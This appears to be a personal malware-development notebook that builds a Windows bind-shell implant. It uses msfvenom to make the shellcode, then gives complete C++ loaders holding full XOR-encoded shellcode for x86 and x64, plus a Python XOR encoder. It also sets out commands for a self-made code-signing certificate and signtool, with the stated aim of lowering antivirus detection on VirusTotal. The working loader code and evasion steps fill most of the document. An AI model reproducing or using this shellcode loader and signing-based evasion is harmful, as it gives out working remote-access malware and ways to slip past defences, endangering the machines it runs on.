## Introduction

## Generate a Malware
Generate a bind shell with **msfvenom** with `msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c` command
![[Pasted image 20250110214355.png]]

source code 
```c++
void main()
{
	//Bind shelle generate with MsVenom
	const char shellcode[] ="\xfc\xe8\x82\x00 (....)";

	//Allocate memory region
	PVOID shellocode_exec = VirtualAlloc(0, sizeof shellcode,  MEM_COMMIT | MEM_RESERVE, MEM_WRITE_WATCH);
	
	//Assigne value of memory pointer (shellocode_exec)
	RtlCopyMemory(shellocode_exec, shellcode, sizeof shellcode);

	//Create a new thread where the memory pointer will be executed 
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL,0, (PTHREAD_START_ROUTINE)shellocode_exec, NULL,0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
```

TODO: Explain all Windows API function

Now compile the code in release mode to remove all debugging symbols and information and upload the .exe file in VirusTotal.

![[Pasted image 20250110222108.png]]
## Obfuscation
It is very dirty code... try to obfuscate that to evade heuristic analysis and see if the score goes down 

I use simple XOR python script to obfuscate my payload
```python

# La stringa di shellcode criptata
shellcode = bytes.fromhex(
    "fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 "
    "31 ff ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52 10 8b 4a 3c 8b 4c 11 78 "
    "e3 48 01 d1 51 8b 59 20 01 d3 8b 49 18 e3 3a 49 8b 34 8b 01 d6 31 ff ac c1 cf 0d 01 "
    "c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 "
    "8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a 8b 12 eb 8d 5d 68 33 32 "
    "00 00 68 77 73 32 5f 54 68 4c 77 26 07 ff d5 b8 90 01 00 00 29 c4 54 50 68 29 80 6b "
    "00 ff d5 6a 08 59 50 e2 fd 40 50 40 50 68 ea 0f df e0 ff d5 97 68 02 00 11 5c 89 e6 "
    "6a 10 56 57 68 c2 db 37 67 ff d5 57 68 b7 e9 38 ff ff d5 57 68 74 ec 3b e1 ff d5 57 "
    "97 68 75 6e 4d 61 ff d5 68 63 6d 64 00 89 e3 57 57 57 31 f6 6a 12 59 56 e2 fd 66 c7 "
    "44 24 3c 01 01 8d 44 24 10 c6 00 44 54 50 56 56 56 46 56 4e 56 56 53 56 68 79 cc 3f "
    "86 ff d5 89 e0 4e 56 46 ff 30 68 08 87 1d 60 ff d5 bb f0 b5 a2 56 68 a6 95 bd 9d ff "
    "d5 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 53 ff d5"
)
# La chiave XOR
key = 0x44

# Encoding XOR
print("Encoding....")
decoded_shellcode = bytearray()
for byte in shellcode:
    decoded_shellcode.append(byte ^ key)

# Stampa il risultato in formato esadecimale
test = decoded_shellcode.hex()
print(test + "\n\n")
```
and i have obtain this value:
```text
b8acc644444424cda1758420cf1474cf1648cf1650cf366c4bf30e6275bbe8782538466864858b494583a6b61613cf1654cf0e78cf08553ca70c459515cf1d644597cf0d5ca77e0dcf70cf459275bbe8858b4945837ca431b24739bc7f396031a01ccf1c60459722cf480fcf1c584597cf40cf4594cd0060601f1f251d1e15bba41b1b1ecf56afc9192c777644442c3337761b102c08336243bb91fcd44544446d8010142c6dc42f44bb912e4c1d14a6b9041404142cae4b9ba4bb91d32c46445518cda22e5412132c869f7323bb91132cf3ad7cbbbb91132c30a87fa5bb9113d32c312a0925bb912c27292044cda713131375b22e561d12a6b922830060784545c9006054824400101412121202120a121217122c3d887bc2bb91cda40a1202bb742c4cc35924bb91ffb4f1e6122ce2d1f9d9bb917842384ec4bfa43141ff0357362b2e4417bb91
```

This is our payload "encrypted" with `0x44` key.
Now integrate this payload in our C++  code and decrypt the payload before to create a remote thread like this
```C++
#include <iostream>
#include <Windows.h>
#include <string>
#include <iomanip>
#include <sstream>
#include <vector>

int main()
{
	std::string shellcode = "b8acc644444424cda1758420cf1474cf1648cf1650cf366c4bf30e6275bbe8782538466864858b494583a6b61613cf1654cf0e78cf08553ca70c459515cf1d644597cf0d5ca77e0dcf70cf459275bbe8858b4945837ca431b24739bc7f396031a01ccf1c60459722cf480fcf1c584597cf40cf4594cd0060601f1f251d1e15bba41b1b1ecf56afc9192c777644442c3337761b102c08336243bb91fcd44544446d8010142c6dc42f44bb912e4c1d14a6b9041404142cae4b9ba4bb91d32c46445518cda22e5412132c869f7323bb91132cf3ad7cbbbb91132c30a87fa5bb9113d32c312a0925bb912c27292044cda713131375b22e561d12a6b922830060784545c9006054824400101412121202120a121217122c3d887bc2bb91cda40a1202bb742c4cc35924bb91ffb4f1e6122ce2d1f9d9bb917842384ec4bfa43141ff0357362b2e4417bb91";
	std::vector<unsigned char> vector_shellcode_decoded;

	//Decrypt XOR
	for (size_t i = 0; i < shellcode.length(); i += 2) {
		std::string byteStr = shellcode.substr(i, 2);
		unsigned char decoded_byte = strtol(byteStr.c_str(), nullptr, 16);
		decoded_byte ^= 0x44; //XOR key
		vector_shellcode_decoded.push_back(decoded_byte);
	}


	const unsigned char* shellcode_decoded = vector_shellcode_decoded.data();
	//Allocate memory region
	PVOID shellcode_exec = VirtualAlloc(0, vector_shellcode_decoded.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcode_exec == NULL) {
		std::cerr << "VirtualAlloc failed with error code: " << GetLastError() << std::endl;
		return -1;
	}
	//Assigne value of memory pointer (shellocode_exec)
	RtlCopyMemory(shellcode_exec, shellcode_decoded, vector_shellcode_decoded.size());

	//Create a new thread where the memory pointer will be executed 
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	if (!hThread) {
		std::cerr << "Thread creation failed!" << std::endl;
		VirtualFree(shellcode_exec, 0, MEM_RELEASE);
		return -1;
	}

	WaitForSingleObject(hThread, INFINITE);
	VirtualFree(shellcode_exec, 0, MEM_RELEASE);

	return 0;
}

}
```

Upload on VirusTotal:
![[Pasted image 20250111041459.png]]
Not bad 22 with a simple XOR "encryption"

### Signing the PE
Analyzing a hello world program in VirusTotal we may notice that as flagged as malicious.

```C
#include <iostream>
#include <Windows.h>
void main()
{
	printf("Hello World");
}
```

![[Pasted image 20250111230127.png]]
This because some malware detection engines may flag the unsigned binaries as suspicious.
#### Create a certificate
Use **makecert** to generate a certificate in windows OS.
```bash
MakeCert.exe -r -pe -n "CN=Malwr CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cer
ce

certutil.exe -user -addstore Root C:\Cert\MalwrCA.cer

MakeCert.exe -pe -n "CN=Malwr Cert" -a sha256 -cy end -sky signature -ic C:\Cert\MalwrCA.cer -iv C:\Cert\MalwrCA.pvk -sv C:\Cert\MalwrCA.pvk C:\Cert\MalwrCA.cer

pvk2pfx.exe -pvk C:\Cert\MalwrCA.pvk -spc C:\Cert\MalwrCA.cer -pfx C:\Cert\MalwrCA.pfx

```

After execution the above command we have generate a Malwr certification authority,imported it to our certificate store, created code-signing certificate inÂ `.pfx`.

Now we need to sign the executable, there are two way to do that
- Manually: Every time we want sign the executable we need to run this command
```bash
signtool.exe sign /v /f C:\Cert\MalwrCA.pfx /fd sha256 /t http://timestamp.digicert.com C:\Users\MALDEV01\source\repos\SimpleShellCode\x64\Release\SimpleShellCode.exe
```

- Automatically: Add the command line on VS Post-Build Event: 
```bash
signtool.exe sign /v /f $(SolutionDir)Cert\MalwrSPC.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll $(TargetPath)
```

Upload on VirusTotal the signed malware and we can see that the score has decreased
![[Pasted image 20250112002556.png]]


## Switch to x64
```C++
#include <iostream>
#include <Windows.h>
#include <string>
#include <iomanip>
#include <sstream>
#include <vector>

int main()
{
	std::string shellcode = "b80cc7a0b4ac84444444051505141615120c7596210ccf16240ccf165c0ccf16640ccf36140c4bf30e0e09758d0c7584e878253846686405858d49054585a6a91605150ccf1664cf06780c4594cfc4cc4444440cc18430230c459414cf0c5c00cf04640d4594a7120cbb8d05cf70cc0c459209758d0c7584e805858d490545857ca431b5084708604c017d95319c1c00cf04600d45942205cf480c00cf04580d459405cf40cc0c4594051c051c1a1d1e051c051d051e0cc7a8640516bba41c051d1e0ccf56ad13bbbbbb190dfa3337761b7776444405120dcda20cc5a8e44544440dcda10df8464455184444444405100dcda008cdb505fe08336243bb9108cdae2c454544441d05fe6dc42f44bb91141409758d0975840cbb840ccd860cbb840ccd8505feae4b9ba4bb910ccd832e54051c08cda60ccdbd05fe869f7323bb910c75960ccdbd05fef3ad7cbbbb910975840c75960ccdbd05fe30a87fa5bb910ccdbd0ccd8305fe312a0925bb910cc580e44644440dfc2729204444444444051405140ccda61313130975842e491d0514a6b8228300601045450cc900605c82442c0ccda212140514051405140dbb8405140dbb8c09cd8508cd8505fe3d887bc2bb910c75960cbb8ecf4a05fe4cc35924bb91ffb4f1e61205fee2d1f9d9bb910cc7806c7842384ec4bfa43141ff0357362b2e441d05cd9ebb91";
	std::vector<unsigned char> vector_shellcode_decoded;

	//Decrypt XOR
	for (size_t i = 0; i < shellcode.length(); i += 2) {
		std::string byteStr = shellcode.substr(i, 2);
		unsigned char decoded_byte = strtol(byteStr.c_str(), nullptr, 16);
		decoded_byte ^= 0x44; //XOR key
		vector_shellcode_decoded.push_back(decoded_byte);
	}


	const unsigned char* shellcode_decoded = vector_shellcode_decoded.data();
	//Allocate memory region
	PVOID shellcode_exec = VirtualAlloc(0, vector_shellcode_decoded.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcode_exec == NULL) {
		std::cerr << "VirtualAlloc failed with error code: " << GetLastError() << std::endl;
		return -1;
	}
	//Assigne value of memory pointer (shellocode_exec)
	RtlCopyMemory(shellcode_exec, shellcode_decoded, vector_shellcode_decoded.size());

	//Create a new thread where the memory pointer will be executed 
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	if (!hThread) {
		std::cerr << "Thread creation failed!" << std::endl;
		VirtualFree(shellcode_exec, 0, MEM_RELEASE);
		return -1;
	}

	WaitForSingleObject(hThread, INFINITE);
	VirtualFree(shellcode_exec, 0, MEM_RELEASE);

	return 0;
}
```
![[Pasted image 20250112030401.png]]



## Summury
## References
- https://0xpat.github.io/Malware_development_part_1/
- https://github.com/rootkit-io/awesome-malware-development?tab=readme-ov-file


